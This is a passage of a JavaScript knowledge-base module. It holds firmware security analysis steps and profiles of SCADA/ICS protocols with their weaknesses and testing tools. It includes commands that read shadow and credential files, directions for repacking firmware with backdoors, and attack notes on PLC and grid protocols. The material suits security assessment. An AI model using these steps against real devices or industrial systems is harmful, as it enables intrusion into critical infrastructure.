    tool: "grep / strings / trufflehog / firmwalker",
    command: [
      "# Search for common credential patterns:",
      "grep -rn 'password\\|passwd\\|secret\\|api_key\\|apikey\\|token\\|credential' squashfs-root/",
      "",
      "# Extract printable strings from binaries:",
      "strings -n 8 squashfs-root/usr/bin/management_daemon | grep -i 'pass\\|key\\|secret\\|admin'",
      "",
      "# Find hardcoded IPs and URLs:",
      "grep -rnoE '(https?://[^ \"]+|\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b)' squashfs-root/",
      "",
      "# Check shadow/passwd files:",
      "cat squashfs-root/etc/shadow squashfs-root/etc/passwd 2>/dev/null",
      "",
      "# Use firmwalker for automated analysis:",
      "bash firmwalker.sh squashfs-root/ firmwalker_output.txt",
      "",
      "# Search for private keys and certificates:",
      "grep -rl 'BEGIN RSA\\|BEGIN EC\\|BEGIN PRIVATE\\|BEGIN CERTIFICATE' squashfs-root/"
    ]
  },
  {
    step: "Binary Analysis and Disassembly",
    description: "Disassemble and decompile key firmware binaries to understand functionality, identify vulnerabilities, and locate security-critical code paths. Focus on management daemons, web servers, protocol handlers, and authentication modules.",
    tool: "Ghidra / IDA Pro / radare2 / Binary Ninja",
    command: [
      "# Identify binary architecture:",
      "file squashfs-root/usr/bin/httpd",
      "readelf -h squashfs-root/usr/bin/httpd",
      "",
      "# Check binary security features:",
      "checksec --file=squashfs-root/usr/bin/httpd",
      "",
      "# Disassemble with radare2:",
      "r2 -A squashfs-root/usr/bin/httpd",
      "# afl                    # List functions",
      "# axt @sym.system        # Find cross-references to system()",
      "# pdf @main              # Disassemble main function",
      "",
      "# Ghidra headless analysis:",
      "analyzeHeadless /tmp/project project -import squashfs-root/usr/bin/httpd -postScript decompile.py",
      "",
      "# Search for dangerous functions:",
      "r2 -qc 'afl~system\\|strcpy\\|sprintf\\|gets\\|scanf' squashfs-root/usr/bin/httpd"
    ]
  },
  {
    step: "Library and Dependency Analysis",
    description: "Identify shared libraries and their versions to find known CVEs affecting the firmware. IoT devices frequently use outdated versions of OpenSSL, busybox, curl, and other common libraries with known vulnerabilities.",
    tool: "readelf / ldd / strings / CVE databases",
    command: [
      "# List shared library dependencies:",
      "readelf -d squashfs-root/usr/bin/httpd | grep NEEDED",
      "",
      "# Find all shared libraries:",
      "find squashfs-root/ -name '*.so*' -type f",
      "",
      "# Extract library versions:",
      "strings squashfs-root/lib/libssl.so.1.0.0 | grep 'OpenSSL'",
      "strings squashfs-root/bin/busybox | grep 'BusyBox v'",
      "",
      "# Check BusyBox applet list (common IoT binary):",
      "squashfs-root/bin/busybox --list 2>/dev/null || strings squashfs-root/bin/busybox | grep -E '^[a-z]+$' | sort",
      "",
      "# Cross-reference versions against CVE databases:",
      "# Search NVD: https://nvd.nist.gov/vuln/search",
      "# Search CVE Details: https://www.cvedetails.com"
    ]
  },
  {
    step: "Web Interface Security Analysis",
    description: "Analyze the device web administration interface for common web vulnerabilities including command injection, XSS, authentication bypass, CSRF, and insecure direct object references. IoT web interfaces are frequently vulnerable due to limited development resources.",
    tool: "Burp Suite / curl / nikto / custom scripts",
    command: [
      "# Find web server root:",
      "find squashfs-root/ -name 'httpd.conf' -o -name 'lighttpd.conf' -o -name 'nginx.conf'",
      "",
      "# Analyze CGI scripts for command injection:",
      "grep -rn 'system\\|popen\\|exec\\|os.system\\|subprocess' squashfs-root/www/ squashfs-root/usr/lib/cgi-bin/",
      "",
      "# Find authentication logic:",
      "grep -rn 'auth\\|login\\|session\\|cookie\\|token' squashfs-root/www/",
      "",
      "# Check for hardcoded credentials in web files:",
      "grep -rn 'password\\|passwd\\|admin' squashfs-root/www/",
      "",
      "# Look for CSRF protection:",
      "grep -rn 'csrf\\|nonce\\|anti_forgery' squashfs-root/www/",
      "",
      "# Analyze JavaScript for API endpoints and secrets:",
      "find squashfs-root/www/ -name '*.js' -exec grep -l 'api\\|key\\|secret\\|token' {} +"
    ]
  },
  {
    step: "Network Service Enumeration",
    description: "Identify all network services configured to start on the device by analyzing init scripts, service configurations, and inetd/xinetd configurations. Map the device's attack surface from a network perspective.",
    tool: "grep / find / analysis of init scripts",
    command: [
      "# Find init scripts and startup services:",
      "ls -la squashfs-root/etc/init.d/ squashfs-root/etc/rc.d/ 2>/dev/null",
      "",
      "# Check inetd/xinetd configuration:",
      "cat squashfs-root/etc/inetd.conf squashfs-root/etc/xinetd.conf 2>/dev/null",
      "",
      "# Find listening port configurations:",
      "grep -rn 'listen\\|bind\\|port\\|LISTEN' squashfs-root/etc/",
      "",
      "# Check for enabled services:",
      "grep -rn 'telnetd\\|ftpd\\|sshd\\|httpd\\|snmpd\\|upnpd\\|miniupnpd' squashfs-root/etc/",
      "",
      "# Find custom daemons:",
      "find squashfs-root/ -name '*daemon*' -o -name '*server*' -o -name '*service*'",
      "",
      "# Check firewall rules:",
      "cat squashfs-root/etc/iptables.rules 2>/dev/null",
      "grep -rn 'iptables\\|nftables\\|firewall' squashfs-root/etc/"
    ]
  },
  {
    step: "Firmware Emulation",
    description: "Emulate the extracted firmware in QEMU or similar environment to dynamically test the device without physical hardware. This enables network service testing, fuzzing, and debugging of firmware binaries in a controlled environment.",
    tool: "QEMU / firmadyne / FAT (Firmware Analysis Toolkit) / FirmAE",
    command: [
      "# Quick QEMU user-mode emulation of a single binary:",
      "qemu-mipsel-static -L squashfs-root/ squashfs-root/usr/bin/httpd",
      "",
      "# Full system emulation with firmadyne:",
      "python3 sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk firmware.bin images",
      "python3 scripts/getArch.sh images/1.tar.gz",
      "python3 scripts/makeImage.sh 1",
      "python3 scripts/inferNetwork.sh 1",
      "python3 scripts/run.sh 1",
      "",
      "# FirmAE automated emulation:",
      "sudo ./run.sh -r Netgear firmware.bin",
      "",
      "# Debug with QEMU GDB stub:",
      "qemu-mipsel-static -g 1234 -L squashfs-root/ squashfs-root/usr/bin/httpd &",
      "gdb-multiarch -ex 'target remote :1234' squashfs-root/usr/bin/httpd"
    ]
  },
  {
    step: "Cryptographic Analysis",
    description: "Analyze how the firmware implements cryptography: identify algorithms, key management, random number generation, and potential weaknesses. Look for use of deprecated algorithms, weak keys, predictable RNG seeds, and insecure cryptographic patterns.",
    tool: "strings / grep / findcrypt (IDA/Ghidra plugin) / custom scripts",
    command: [
      "# Find cryptographic constants in binaries:",
      "# Use findcrypt plugin in Ghidra/IDA for automated detection",
      "",
      "# Search for cryptographic library usage:",
      "strings squashfs-root/usr/bin/httpd | grep -i 'aes\\|des\\|rsa\\|sha\\|md5\\|hmac\\|encrypt\\|decrypt'",
      "",
      "# Check for hardcoded encryption keys (hex patterns):",
      "grep -rn '0x[0-9a-fA-F]\\{32,\\}' squashfs-root/",
      "",
      "# Find random number generation:",
      "grep -rn '/dev/urandom\\|/dev/random\\|srand\\|rand()\\|RAND_bytes' squashfs-root/",
      "",
      "# Check TLS/SSL configuration:",
      "grep -rn 'ssl\\|tls\\|cipher\\|certificate\\|ca_cert' squashfs-root/etc/",
      "",
      "# Identify crypto libraries:",
      "find squashfs-root/ -name 'libssl*' -o -name 'libcrypto*' -o -name 'libmbedtls*' -o -name 'libwolfssl*'"
    ]
  },
  {
    step: "U-Boot and Bootloader Analysis",
    description: "Analyze the bootloader (typically U-Boot in embedded Linux devices) for configuration, environment variables, boot sequence manipulation opportunities, and potential secure boot bypass. The bootloader controls the entire device initialization chain.",
    tool: "binwalk / strings / mkimage / dumpimage",
    command: [
      "# Extract U-Boot environment:",
      "strings firmware.bin | grep -E '^(bootcmd|bootargs|bootdelay|ethaddr|ipaddr|serverip)='",
      "",
      "# Find U-Boot image headers:",
      "binwalk -y 'u-boot' firmware.bin",
      "",
      "# Extract U-Boot legacy image:",
      "dumpimage -l uImage",
      "dumpimage -o kernel.bin uImage",
      "",
      "# Extract FIT (Flattened Image Tree):",
      "dumpimage -T flat_dt -p 0 -o kernel.bin fitImage",
      "",
      "# Check for U-Boot environment partition:",
      "strings -t d firmware.bin | grep 'bootcmd'",
      "",
      "# Analyze boot arguments for security settings:",
      "# Look for: console=, root=, init=, single, rw"
    ]
  },
  {
    step: "Firmware Comparison and Diffing",
    description: "Compare different firmware versions to identify security patches, new features, and changes. Useful for understanding what vulnerabilities were fixed, finding regression bugs, and identifying the minimal change between versions for targeted analysis.",
    tool: "bindiff / diaphora / diffoscope / radare2",
    command: [
      "# Filesystem-level diff:",
      "diff -rq squashfs-root-v1/ squashfs-root-v2/",
      "",
      "# Detailed binary diff with diffoscope:",
      "diffoscope firmware_v1.bin firmware_v2.bin --html report.html",
      "",
      "# Binary diff with radare2:",
      "radiff2 -g main binary_v1 binary_v2 > diff_graph.dot",
      "",
      "# Compare specific binaries with Diaphora (IDA/Ghidra):",
      "# Export IDB from both versions, run Diaphora for function matching",
      "",
      "# Quick changelog from strings:",
      "diff <(strings firmware_v1.bin | sort -u) <(strings firmware_v2.bin | sort -u)"
    ]
  },
  {
    step: "Firmware Modification and Repacking",
    description: "Modify the extracted firmware (add backdoors, change configurations, inject tools) and repack it into a flashable image. Useful for security testing, adding debug capabilities, or creating proof-of-concept demonstrations of firmware tampering risks.",
    tool: "mksquashfs / mkfs.jffs2 / u-boot mkimage / custom scripts",
    command: [
      "# Repack SquashFS filesystem:",
      "mksquashfs squashfs-root/ new_squashfs.img -comp xz -b 256K",
      "",
      "# Repack JFFS2:",
      "mkfs.jffs2 -d jffs2-root/ -o new_jffs2.img --pad=0x1000000 -e 0x10000 --big-endian",
      "",
      "# Create U-Boot image:",
      "mkimage -A mips -O linux -T kernel -C gzip -a 0x80060000 -e 0x80060000 -n 'Linux' -d kernel.bin.gz uImage",
      "",
      "# Rebuild full firmware (combine bootloader + kernel + rootfs):",
      "dd if=bootloader.bin of=firmware_new.bin bs=1 seek=0",
      "dd if=uImage of=firmware_new.bin bs=1 seek=$KERNEL_OFFSET",
      "dd if=new_squashfs.img of=firmware_new.bin bs=1 seek=$ROOTFS_OFFSET",
      "",
      "# Fix checksums if needed:",
      "# Some vendors use CRC32, MD5, or custom checksums in firmware headers"
    ]
  },
  {
    step: "Automated Firmware Scanning",
    description: "Use automated tools to perform comprehensive firmware security analysis including CVE scanning, credential detection, cryptographic weakness identification, and compliance checking against IoT security standards.",
    tool: "EMBA / FACT / firmware-mod-kit / cve-bin-tool",
    command: [
      "# EMBA - Embedded Analyzer:",
      "sudo ./emba.sh -f firmware.bin -l ./logs/",
      "",
      "# FACT - Firmware Analysis and Comparison Tool:",
      "# Start FACT server and upload firmware via web interface at localhost:5000",
      "",
      "# cve-bin-tool for CVE scanning of binaries:",
      "cve-bin-tool squashfs-root/",
      "",
      "# Firmware Mod Kit for generic extraction/repacking:",
      "extract-firmware.sh firmware.bin",
      "build-firmware.sh firmware-mod/",
      "",
      "# OWASP Firmware Security Testing Methodology checks:",
      "# 1. Information gathering and reconnaissance",
      "# 2. Obtaining firmware",
      "# 3. Analyzing firmware",
      "# 4. Extracting filesystem",
      "# 5. Analyzing filesystem contents",
      "# 6. Emulating firmware",
      "# 7. Dynamic analysis",
      "# 8. Runtime analysis",
      "# 9. Binary exploitation"
    ]
  }
];

// ---------------------------------------------------------------------------
// 7. SCADA_ICS — 15 SCADA/ICS protocol security profiles
// ---------------------------------------------------------------------------

const SCADA_ICS = [
  {
    protocol: "Modbus TCP/RTU",
    description: "The most widely deployed SCADA protocol, used for communication between PLCs, RTUs, HMIs, and SCADA masters. Modbus TCP (port 502) encapsulates the original serial Modbus RTU protocol over TCP/IP. Simple master/slave architecture with function codes for reading/writing coils, discrete inputs, holding registers, and input registers.",
    port: 502,
    vulnerabilities: [
      "Zero authentication - any network-connected host can send commands",
      "No encryption - all register values and commands visible in plaintext",
      "No integrity protection - commands can be modified in transit",
      "Function code 8 (Diagnostics) can restart remote devices",
      "Function code 43 (Device Identification) leaks device information",
      "Broadcast address (Unit ID 0) affects all slave devices simultaneously",
      "Lack of session management enables trivial spoofing",
      "No rate limiting - rapid polling causes DoS on constrained devices"
    ],
    tools: [
      "nmap --script modbus-discover -p 502 <target>",
      "modbus-cli (ruby gem for Modbus interaction)",
      "mbtget (C-based Modbus/TCP client for reading registers)",
      "pymodbus (Python library for Modbus protocol testing)",
      "modbuspal (Java Modbus slave simulator for testing)",
      "smod (Modbus penetration testing framework)",
      "Wireshark with Modbus dissector"
    ]
  },
  {
    protocol: "DNP3 (Distributed Network Protocol 3)",
    description: "Primary SCADA protocol in electric utility, water/wastewater, and oil/gas industries. Designed for reliable communication over noisy serial links, later adapted for TCP/IP. Supports unsolicited responses, time synchronization, secure authentication (DNP3-SA), and file transfer between outstations and master stations.",
    port: 20000,
    vulnerabilities: [
      "Standard DNP3 has no authentication (added in DNP3 Secure Authentication v5)",
      "Cleartext data transmission without encryption wrapper",
      "Cold restart (function code) can reboot remote outstations",
      "Warm restart resets outstation application layer",
      "Write operations can modify outstation configuration",
      "File transfer can upload malicious firmware",
      "Time synchronization spoofing to manipulate event timestamps",
      "Unsolicited response mode can be abused for data flooding",
      "DNP3-SA implementations often have key management weaknesses"
    ],
    tools: [
      "nmap -p 20000 --script dnp3-info <target>",
      "aegis (DNP3 protocol testing and fuzzing)",
      "OpenDNP3 (open-source DNP3 master/outstation library)",
      "Wireshark with DNP3 dissector",
      "dnp3-master (custom Python testing scripts)",
      "GridLAB-D (power grid simulation with DNP3 support)"
    ]
  },
  {
    protocol: "IEC 61850 (MMS/GOOSE/SV)",
    description: "International standard for substation automation in electric power systems. Uses Manufacturing Message Specification (MMS) over TCP for client/server communication, GOOSE (Generic Object Oriented Substation Event) for fast multicast event distribution, and Sampled Values (SV) for digitized analog measurements. Defines a standardized data model for power system equipment.",
    port: 102,
    vulnerabilities: [
      "MMS has no built-in authentication or encryption",
      "GOOSE messages are multicast and can be spoofed with higher sequence numbers",
      "Sampled Values can be injected to provide false measurement data",
      "GOOSE timestamp manipulation causes protective relay misoperation",
      "MMS file transfer enables unauthorized firmware upload",
      "GetNameList/GetVariableAccessAttributes expose entire substation configuration",
      "No integrity protection on GOOSE messages enables bit-flipping",
      "GOOSE stNum/sqNum manipulation for replay attacks"
    ],
    tools: [
      "libIEC61850 (open-source library for IEC 61850 implementation)",
      "IEDScout (commercial IEC 61850 testing tool)",
      "goose-stalker (GOOSE message capture and injection)",
      "Wireshark with IEC 61850/MMS/GOOSE/SV dissectors",
      "omicron IEDScout for IEC 61850 device testing",
      "GridAttackSim for power grid attack simulation"
    ]
  },
  {
    protocol: "IEC 60870-5-104",
    description: "Telecontrol protocol for electric power systems, widely used in European and Asian SCADA deployments. IEC 104 is the TCP/IP adaptation of IEC 101 (serial). Uses Application Service Data Units (ASDUs) for commands and telemetry between control centers and RTUs/substations.",
    port: 2404,
    vulnerabilities: [
      "No authentication in base protocol",
      "Cleartext ASDU transmission without encryption",
      "Command execution (single/double command, setpoint) without authorization",
      "Interrogation commands reveal entire station configuration",
      "Time synchronization manipulation via clock sync ASDU",
      "Sequence number prediction for session hijacking",
      "Test mode activation can be abused to mask malicious changes"
    ],
    tools: [
      "nmap -p 2404 <target>",
      "lib60870 (open-source IEC 60870-5-104 library)",
      "QTester104 (IEC 104 protocol tester)",
      "Wireshark with IEC 104 dissector",
      "iec104-attacker (security testing tool)",
      "Custom scripts using lib60870-C or lib60870-python"
    ]
  },
  {
    protocol: "EtherNet/IP (CIP)",
    description: "Industrial Ethernet protocol using the Common Industrial Protocol (CIP) over TCP/UDP. Primary protocol for Rockwell/Allen-Bradley PLCs and widely used in manufacturing automation. Supports implicit (UDP real-time I/O) and explicit (TCP configuration/diagnostics) messaging.",
    port: 44818,
    vulnerabilities: [
      "No authentication for CIP service requests",
      "Unencrypted communication of PLC programs and data",
      "ListIdentity broadcast discovers all EtherNet/IP devices",
      "PLC program upload/download without authorization",
      "PLC mode change (Run/Program/Remote) without authentication",
      "Real-time I/O data (implicit messaging) can be injected over UDP",
      "CIP routing enables access to devices behind NAT/firewalls",
      "Denial of service via CIP connection exhaustion"
    ],
    tools: [
      "nmap -p 44818 --script enip-info <target>",
      "pycomm3 (Python library for EtherNet/IP communication)",
      "Metasploit EtherNet/IP modules",
      "CIPster (open-source EtherNet/IP stack)",
      "Wireshark with EtherNet/IP and CIP dissectors",
      "EtherNet/IP Explorer (Rockwell tool for device discovery)"
    ]
  },
  {
    protocol: "S7comm / S7comm Plus",
    description: "Proprietary Siemens protocol for communication with S7 series PLCs (S7-300, S7-400, S7-1200, S7-1500). S7comm is the legacy protocol (unencrypted); S7comm Plus (used by S7-1200/1500 firmware >= v4) adds integrity protection but can still be attacked. Primary target in ICS security research.",
    port: 102,
    vulnerabilities: [
      "S7comm has no authentication (password protection is trivially bypassed)",
      "CPU start/stop commands executable without authorization",
      "PLC program upload/download without proper authentication",
      "Diagnostic functions expose CPU state and memory contents",
      "S7comm Plus anti-replay can be bypassed with session manipulation",
      "Default passwords on CPU protection levels (1-3)",
      "SZL (System Status List) queries reveal detailed device information",
      "Block transfer enables arbitrary PLC code modification"
    ],
    tools: [
      "nmap -p 102 --script s7-info <target>",
      "snap7 (open-source S7comm library for multiple platforms)",
      "python-snap7 (Python bindings for snap7)",
      "s7-brute-offline.py (offline password brute force)",
      "PLCScan (PLC discovery and information gathering)",
      "Metasploit Siemens S7 modules",
      "Wireshark with S7comm and S7comm Plus dissectors"
    ]
  },
  {
    protocol: "OPC DA / OPC UA",
    description: "OPC (Open Platform Communications) provides interoperability for industrial automation. OPC DA (Data Access, legacy) uses Microsoft DCOM; OPC UA (Unified Architecture) is platform-independent with TCP binary and HTTPS transports. OPC UA supports security modes but they are often misconfigured or disabled.",
    port: 4840,
    vulnerabilities: [
      "OPC DA inherits all DCOM security vulnerabilities",
      "OPC UA SecurityMode 'None' allows unauthenticated unencrypted access",
      "Anonymous authentication frequently enabled by default",
      "Self-signed certificate acceptance without validation",
      "Method nodes may allow unauthorized remote code execution",
      "Historical data access reveals operational patterns for reconnaissance",
      "Discovery endpoint enumeration reveals all registered servers",
      "GDS (Global Discovery Server) manipulation for trust bootstrapping attacks"
    ],
    tools: [
      "opcua-client-gui (graphical OPC UA client)",
      "python-opcua / asyncua (Python OPC UA library)",
      "UaExpert (Unified Automation OPC UA client)",
      "nmap --script opcua-info -p 4840 <target>",
      "opc-ua-scanner (security configuration scanner)",
      "Wireshark with OPC UA dissector"
    ]
  },
  {
    protocol: "BACnet/IP",
    description: "Building automation protocol for HVAC, lighting, access control, and fire safety systems. BACnet/IP uses UDP port 47808 for communication between building controllers, sensors, and management stations. Defines standardized object types (analog input, binary output, schedule, trend log) for building automation interoperability.",
    port: 47808,
    vulnerabilities: [
      "No authentication in standard BACnet/IP (BACnet/SC adds TLS)",
      "Who-Is/I-Am broadcast discovers entire building automation network",
      "ReadProperty/WriteProperty accessible without authorization",
      "Schedule object manipulation can disrupt building operations",
      "Trend log access reveals building occupancy and usage patterns",
      "Priority array manipulation overrides automatic control",
      "Device communication control (DCC) can isolate devices from network",
      "ReinitializeDevice can force device restart or factory reset"
    ],
    tools: [
      "nmap -p 47808 -sU --script bacnet-info <target>",
      "bacnet-stack (open-source BACnet protocol stack)",
      "BACnet browser and scanner tools",
      "Wireshark with BACnet dissector",
      "YABE (Yet Another BACnet Explorer)",
      "bacnet-scan for subnet-wide device discovery"
    ]
  },
  {
    protocol: "PROFINET",
    description: "Industrial Ethernet standard from Siemens/PI, used for real-time communication between PLCs, drives, I/O modules, and HMIs in factory automation. Supports three performance classes: TCP/IP for non-critical data, RT (Real-Time) for cyclic I/O, and IRT (Isochronous Real-Time) for motion control with sub-millisecond precision.",
    port: 34964,
    vulnerabilities: [
      "No authentication in PROFINET RT and IRT communication",
      "DCP (Discovery and Configuration Protocol) allows unauthorized device reconfiguration",
      "Device name and IP address can be changed via DCP Set commands",
      "Real-time cyclic data can be injected on layer 2",
      "SNMP-based management with default community strings",
      "Firmware update over PROFINET without integrity verification",
      "Topology discovery (LLDP/DCP) reveals network architecture",
      "Connection establishment (Connect/Write) lacks authorization"
    ],
    tools: [
      "Wireshark with PROFINET dissector (built-in)",
      "PRONETA (Siemens PROFINET network analysis tool)",
      "profinet-scanner (open-source PROFINET discovery)",
      "DCP protocol tools for device configuration testing",
      "Scapy with PROFINET layer support",
      "Codesys for PROFINET controller testing"
    ]
  },
  {
    protocol: "FINS (Factory Interface Network Service)",
    description: "Omron proprietary protocol for communication with Omron PLCs (CJ, CS, NJ series). FINS operates over TCP (port 9600) and UDP (port 9600). Supports memory area read/write, PLC mode change, program transfer, and clock synchronization.",
    port: 9600,
    vulnerabilities: [
      "No authentication mechanism in FINS protocol",
      "Direct memory area read/write without authorization",
      "PLC run/stop mode change executable remotely",
      "Program area transfer enables malicious code upload",
      "Clock write command can manipulate PLC timestamps",
      "Error reset command can mask fault conditions",
      "CPU unit data read reveals detailed system configuration",
      "File operations (read, write, delete) on PLC filesystem"
    ],
    tools: [
      "nmap --script omron-info -p 9600 <target>",
      "python-fins (Python FINS protocol library)",
      "Metasploit Omron FINS modules",
      "Wireshark with FINS dissector",
      "FINS-shell (interactive FINS protocol client)",
      "Custom scapy-based FINS scripts"
    ]
  },
  {
    protocol: "HART-IP",
    description: "Highway Addressable Remote Transducer protocol adapted for IP networks. HART is the most widely installed field instrument protocol in process industries. HART-IP enables IP-based access to HART field device data for configuration, monitoring, and diagnostics.",
    port: 5094,
    vulnerabilities: [
      "No authentication in HART-IP protocol",
      "Device configuration changes without authorization",
      "Cleartext transmission of process variables and device data",
      "Device identity spoofing through tag and address manipulation",
      "Diagnostic commands can disrupt device operation",
      "Burst mode manipulation floods network with unsolicited messages",
      "Multi-drop HART allows access to all devices on a wire pair"
    ],
    tools: [
      "FieldComm Group HART test tools",
      "Wireshark with HART-IP dissector",
      "Custom HART-IP scripts (UDP-based protocol)",
      "HART communicator (handheld or software-based)",
      "nmap -p 5094 -sU <target> for discovery"
    ]
  },
  {
    protocol: "ICCP/TASE.2 (IEC 60870-6)",
    description: "Inter-Control Center Communications Protocol used for data exchange between utility control centers. Enables sharing of real-time power system data, scheduled values, and control commands between different utility organizations. Built on MMS (Manufacturing Message Specification) over TCP.",
    port: 102,
    vulnerabilities: [
      "MMS transport has no built-in encryption",
      "Bilateral table manipulation to expand authorized data access",
      "Control point access enables unauthorized power system commands",
      "Information set enumeration reveals inter-utility data sharing topology",
      "Block transfer enables large data exfiltration",
      "Critical infrastructure dependency on inter-utility ICCP links",
      "MMS authentication weaknesses apply to ICCP",
      "Transfer set manipulation alters real-time data flows"
    ],
    tools: [
      "libIEC61850 (includes MMS protocol support)",
      "Wireshark with MMS/ICCP dissector",
      "Custom MMS protocol testing scripts",
      "Triangle MicroWorks ICCP tools (commercial)",
      "ICCP/TASE.2 conformance test suites"
    ]
  },
  {
    protocol: "CAN Bus (Controller Area Network)",
    description: "Serial bus protocol originally designed for automotive applications, now widely used in industrial automation, medical devices, and building systems. CAN bus uses broadcast messaging with priority-based arbitration. Variants include CAN 2.0A (11-bit ID), CAN 2.0B (29-bit ID), and CAN FD (flexible data rate).",
    port: null,
    vulnerabilities: [
      "No authentication - any node can send any message ID",
      "No encryption - all messages visible to all bus nodes",
      "Priority-based arbitration enables dominant message DoS",
      "No source addressing - message spoofing is trivial",
      "Bus-off attack forces nodes into error passive/bus-off state",
      "Diagnostic services (UDS/OBD-II) accessible without authentication",
      "Firmware update over CAN (UDS) often lacks verification",
      "Frame injection enables unauthorized actuator control"
    ],
    tools: [
      "can-utils (Linux SocketCAN utilities): candump, cansend, cangen",
      "SavvyCAN (cross-platform CAN bus analysis GUI)",
      "CANtact / PCAN / ValueCAN hardware interfaces",
      "Wireshark with SocketCAN/CAN dissector",
      "ICSim (Instrument Cluster Simulator for testing)",
      "caringcaribou (CAN bus security testing tool)",
      "python-can (Python CAN bus library)"
    ]
  },
  {
    protocol: "GE SRTP (Service Request Transport Protocol)",
    description: "General Electric proprietary protocol used for communication with GE PACSystems (RX3i, RX7i) and Series 90 PLCs. SRTP supports program transfer, memory read/write, PLC control, and diagnostics. Commonly found in power generation, oil/gas, and water treatment facilities.",
    port: 18245,
    vulnerabilities: [
      "No authentication for service requests",
      "Memory read provides access to PLC program and data",
      "Program upload/download without authorization",
      "PLC run/stop control without authentication",
      "Diagnostic functions reveal system configuration",
      "Date/time manipulation affects event logging",
      "I/O forcing can override safety interlocks",
      "Privileged operations accessible to any network client"
    ],
    tools: [
      "nmap -p 18245 --script ge-srtp-info <target>",
      "Metasploit GE SRTP modules",
      "Custom Python scripts for SRTP protocol interaction",
      "Wireshark with GE SRTP dissector",
      "Proficy Machine Edition (GE programming software)"
    ]
  },
  {
    protocol: "CODESYS V3",
    description: "IEC 61131-3 compliant runtime system and programming environment used by over 500 device manufacturers. CODESYS provides a vendor-independent PLC programming platform with its own proprietary communication protocol for program download, debugging, and device management.",
    port: 11740,
    vulnerabilities: [
      "Default credentials or no authentication on many deployments",
      "PLC program upload/download without proper authorization",
      "Online change allows runtime code modification",
      "Web visualization server often exposed without authentication",
      "File system access through CODESYS protocol",
      "Debug functionality enables variable manipulation at runtime",
      "Gateway routing enables access to devices behind the CODESYS gateway",
      "Known CVEs in CODESYS runtime (CVE-2021-29241, CVE-2022-22515 series)"
    ],
    tools: [
      "nmap -p 11740,8080 <target>",
      "CODESYS Development System for protocol interaction",
      "Metasploit CODESYS modules",
      "Wireshark with CODESYS V3 dissector",
      "Custom scripts targeting CODESYS runtime API",
      "codesys-shell (CODESYS protocol testing tool)"
    ]
  }
];

// ---------------------------------------------------------------------------
// Export all knowledge bases
// ---------------------------------------------------------------------------

module.exports = {
  WIFI_ATTACKS,
  WIFI_TOOLS,
  BLUETOOTH_ATTACKS,
  IOT_PROTOCOLS,
  IOT_COMMON_VULNS,
  FIRMWARE_ANALYSIS,
  SCADA_ICS
};
